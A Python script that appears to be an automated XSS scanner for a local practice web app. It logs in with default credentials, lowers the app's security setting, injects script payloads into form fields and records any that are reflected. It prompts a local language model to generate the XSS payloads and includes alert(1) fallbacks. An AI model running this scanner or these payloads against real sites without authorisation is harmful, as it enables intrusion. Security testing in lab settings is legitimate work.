import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json

# -----------------------------
# CONFIG
# -----------------------------
BASE_URL = "http://localhost:8080/"
LOGIN_URL = urljoin(BASE_URL, "login.php")

session = requests.Session()

# -----------------------------
# GLOBAL STORAGE
# -----------------------------
vulnerabilities = []
payloads = []   # ✅ GLOBAL payloads

# -----------------------------
# GENERATE PAYLOADS (OLLAMA)
# -----------------------------
def generate_payloads():
    print("[+] Generating XSS payloads using Ollama...")

    try:
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "qwen3:1.7b",
                "prompt": "Generate 10 unique XSS payloads. Only return payloads line by line. No explanation.",
                "stream": False
            }
        )

        text = response.json()["response"]

        generated = []

        for line in text.split("\n"):
            line = line.strip()

            if line:
                if ". " in line:
                    line = line.split(". ", 1)[-1]

                if not line.lower().startswith(("here", "sure")):
                    generated.append(line)

        print(f"[+] {len(generated)} payloads generated")
        return generated

    except Exception as e:
        print("[-] Ollama failed:", e)

        return [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>"
        ]

# -----------------------------
# LOGIN
# -----------------------------
def login():
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else None

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    if token_value:
        login_data["user_token"] = token_value

    response = session.post(LOGIN_URL, data=login_data)

    if response.status_code == 200:
        print("[+] Login successful")
        session.cookies.set("security", "low")
    else:
        print("[-] Login failed")
        exit()

# -----------------------------
# GET FORMS
# -----------------------------
def get_forms(url):
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except:
        return []

# -----------------------------
# FORM DETAILS
# -----------------------------
def get_form_details(form):
    details = {}

    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()

    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")

        inputs.append({
            "type": input_type,
            "name": input_name
        })

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs

    return details

# -----------------------------
# SUBMIT FORM
# -----------------------------
def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["name"] is None:
            continue

        if input["type"] in ["text", "search"]:
            data[input["name"]] = payload
        else:
            data[input["name"]] = "test"

    if form_details["method"] == "post":
        return session.post(target_url, data=data)
    else:
        return session.get(target_url, params=data)

# -----------------------------
# SCAN XSS
# -----------------------------
def scan_xss(url):
    print(f"\n[+] Scanning: {url}")

    forms = get_forms(url)
    print(f"[+] Found {len(forms)} forms")

    is_vulnerable = False

    for form in forms:
        form_details = get_form_details(form)

        for payload in payloads:   # ✅ FIXED
            try:
                response = submit_form(form_details, url, payload)

                if payload in response.text:
                    print("\n[!!!] XSS Vulnerability Found!")
                    print(f"URL: {url}")
                    print(f"Payload: {payload}")

                    vulnerabilities.append({
                        "url": url,
                        "payload": payload,
                        "method": form_details["method"],
                        "action": form_details["action"]
                    })

                    is_vulnerable = True

            except:
                continue

    if not is_vulnerable:
        print("[-] No XSS vulnerability detected.")

# -----------------------------
# LOAD URLS
# -----------------------------
def load_urls(file_path="urls.json"):
    try:
        with open(file_path, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        print("[-] urls.json not found")
        return []

# -----------------------------
# SAVE RESULTS
# -----------------------------
def save_vulnerabilities(file_path="vulnerabilities_xss.json"):
    with open(file_path, "w") as f:
        json.dump(vulnerabilities, f, indent=4)

    print(f"\n[+] Saved {len(vulnerabilities)} vulnerabilities")

# -----------------------------
# MAIN
# -----------------------------
if __name__ == "__main__":
    login()

    # ✅ GENERATE ONCE
    payloads = generate_payloads()

    urls = load_urls()
    print(f"[+] Loaded {len(urls)} URLs")

    for url in urls:
        scan_xss(url)

    save_vulnerabilities()